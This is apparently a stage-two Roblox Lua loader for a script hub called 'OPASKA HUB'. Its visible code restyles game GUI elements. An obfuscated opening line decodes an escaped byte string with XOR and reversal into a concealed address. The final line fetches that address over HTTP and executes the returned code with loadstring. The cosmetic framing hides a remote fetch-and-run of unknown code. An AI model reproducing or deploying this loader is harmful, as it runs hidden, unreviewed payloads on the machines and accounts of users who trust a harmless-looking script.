
--[[ STAGE 2: VISUAL CORE ]]
local HllP1NJNjlS_Oizc6M="\255\237\008\200\005\193\182\183\011\194\203\017\041\021\025\012\011\035\049\055\038\021\084\037\045\049\045\049\092\075\083\098\090\083\104\106\105\088\088\095\089\109\118\023\090\097\091\097\033\102\104\101\081\111\105\117\094\112\053\114\101\124\123\129\123\133\131\136\137\140\077\145\145\143\086\130\154\149\136\160\161\159\146\161\149\149\170\153\184\158\187\175\122\163\187\172\129\131\122\179\184\182\184\214"local kABOn5DGECm56r=55 local BFgwcPL7f7q809R=152 local tnCZ1pmrlQJN8=0 local MQU9pdLFbgr6M1bMUHqS=2 local _Ruy3GXHqbzRt4TWPDQ=15 local jbcm_0yy0N4XDF3Z=true local UW_NyKLVBhzNE6=bit32 and bit32.bxor if not UW_NyKLVBhzNE6 then UW_NyKLVBhzNE6=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local UYA8Vk88sqRvad55DUyVi={}for c7WP7cazW48Ta2IySTJJ7=1,#HllP1NJNjlS_Oizc6M do local upONX1RGvDU_95lhMiPT=string.byte(HllP1NJNjlS_Oizc6M,c7WP7cazW48Ta2IySTJJ7)local yWKK3rZA7LPkRK6HI7AlFE=(BFgwcPL7f7q809R+(c7WP7cazW48Ta2IySTJJ7*MQU9pdLFbgr6M1bMUHqS)+_Ruy3GXHqbzRt4TWPDQ)%256 if tnCZ1pmrlQJN8==0 then upONX1RGvDU_95lhMiPT=(upONX1RGvDU_95lhMiPT-yWKK3rZA7LPkRK6HI7AlFE)%256 UYA8Vk88sqRvad55DUyVi[c7WP7cazW48Ta2IySTJJ7]=string.char(UW_NyKLVBhzNE6(upONX1RGvDU_95lhMiPT,kABOn5DGECm56r))else upONX1RGvDU_95lhMiPT=UW_NyKLVBhzNE6(upONX1RGvDU_95lhMiPT,kABOn5DGECm56r)UYA8Vk88sqRvad55DUyVi[c7WP7cazW48Ta2IySTJJ7]=string.char((upONX1RGvDU_95lhMiPT-yWKK3rZA7LPkRK6HI7AlFE)%256)end end local YmHwwmt0FjLimww=table.concat(UYA8Vk88sqRvad55DUyVi)if jbcm_0yy0N4XDF3Z then YmHwwmt0FjLimww=string.reverse(YmHwwmt0FjLimww)end local EgBruNkWuxrrj9m1W9UkCC=YmHwwmt0FjLimww
local HubName = "OPASKA HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(EgBruNkWuxrrj9m1W9UkCC))()
